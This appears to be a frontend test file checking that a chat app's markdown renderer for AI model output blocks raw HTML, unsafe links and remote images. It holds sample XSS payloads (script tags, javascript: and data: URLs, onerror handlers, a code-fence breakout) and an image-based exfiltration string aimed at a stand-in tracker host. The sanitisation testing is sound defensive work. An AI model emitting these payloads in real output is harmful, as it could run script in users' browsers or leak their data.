import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownMessage } from "./MarkdownMessage";

describe("MarkdownMessage", () => {
  it("renders GFM headings, emphasis, and table cells", () => {
    render(
      <MarkdownMessage>
        {`## Who I am

I am **Grok**.

| Path | Kind |
| --- | --- |
| desktop | app |
`}
      </MarkdownMessage>,
    );

    expect(screen.getByRole("heading", { level: 2, name: /who i am/i })).toBeInTheDocument();
    expect(screen.getByText("Grok").tagName).toBe("STRONG");
    expect(screen.getByRole("cell", { name: "desktop" })).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: "Path" })).toBeInTheDocument();
  });

  it("does not render raw HTML from the model", () => {
    const { container } = render(
      <MarkdownMessage>{"hello <script>window.__xss=1</script> world"}</MarkdownMessage>,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(screen.getByText(/hello/i)).toBeInTheDocument();
  });

  it("only keeps https links", () => {
    render(
      <MarkdownMessage>
        {"[safe](https://example.com) [bad](javascript:alert(1)) [http](http://example.com)"}
      </MarkdownMessage>,
    );
    const link = screen.getByRole("link", { name: "safe" });
    expect(link).toHaveAttribute("href", "https://example.com");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", expect.stringContaining("noreferrer"));
    expect(screen.queryByRole("link", { name: "bad" })).not.toBeInTheDocument();
    expect(screen.queryByRole("link", { name: "http" })).not.toBeInTheDocument();
  });

  it("never loads a remote image the model asked for", () => {
    // An image is the cheapest exfiltration channel in a markdown renderer:
    // rendering one would tell the author the message had been read, and could
    // carry data in the query string.
    const { container } = render(
      <MarkdownMessage>
        {"![alt](https://tracker.example/pixel.png?leak=secret)"}
      </MarkdownMessage>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("tracker.example");
  });

  it("refuses a data URL as a link target", () => {
    render(<MarkdownMessage>{"[open](data:text/html;base64,PHNjcmlwdD4=)"}</MarkdownMessage>);
    expect(screen.queryByRole("link", { name: "open" })).not.toBeInTheDocument();
  });

  it("does not let raw HTML smuggle an event handler in", () => {
    // Checking only for <script> would miss the far more common attribute
    // vector, so this asserts on the handler text itself.
    const { container } = render(
      <MarkdownMessage>
        {'before <img src=x onerror="window.__xss=1"> <b onmouseover="window.__xss=2">hi</b> after'}
      </MarkdownMessage>,
    );
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("onmouseover");
    expect(screen.getByText(/before/)).toBeInTheDocument();
  });

  it("cannot be made to create an element from a code fence language", () => {
    // The fence info string is attacker-controlled and lands in a className.
    // What matters is not how it serialises — a quote escaped to `&quot;`
    // keeps the attribute intact — but that it stays inert text and never
    // becomes a node.
    const { container } = render(
      <MarkdownMessage>{'```js"><script>window.__xss=3</script>\ncode\n```'}</MarkdownMessage>,
    );
    expect(container.querySelectorAll("script")).toHaveLength(0);
    expect(Object.hasOwn(window, "__xss")).toBe(false);
    // The payload is confined to the attribute of the one expected element.
    expect(container.querySelector("code")?.className).toContain("<script>");
  });

  it("shows a streaming caret when asked", () => {
    const { container } = render(
      <MarkdownMessage streaming>{"partial"}</MarkdownMessage>,
    );
    // Identify the caret itself, not merely some aria-hidden node: every
    // icon in the app sets that attribute.
    expect(container.querySelector("[data-testid='streaming-caret']")).not.toBeNull();
  });

  it("shows no caret when not streaming", () => {
    const { container } = render(<MarkdownMessage>{"done"}</MarkdownMessage>);
    expect(container.querySelector("[data-testid='streaming-caret']")).toBeNull();
  });
});
